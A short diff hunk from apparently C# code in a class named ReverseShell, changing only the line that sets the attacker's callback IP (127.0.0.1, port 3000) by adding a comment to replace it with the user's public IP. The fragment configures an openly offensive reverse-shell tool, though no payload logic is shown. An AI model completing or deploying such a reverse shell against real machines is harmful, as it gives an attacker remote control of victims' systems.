@@ -292,7 +292,7 @@ class ReverseShell
         b();
         a();
 
-        string attackerIP = "127.0.0.1";
+        string attackerIP = "127.0.0.1"; // change this to your PUBLIC IP
         int attackerPort = 3000;
 
         try
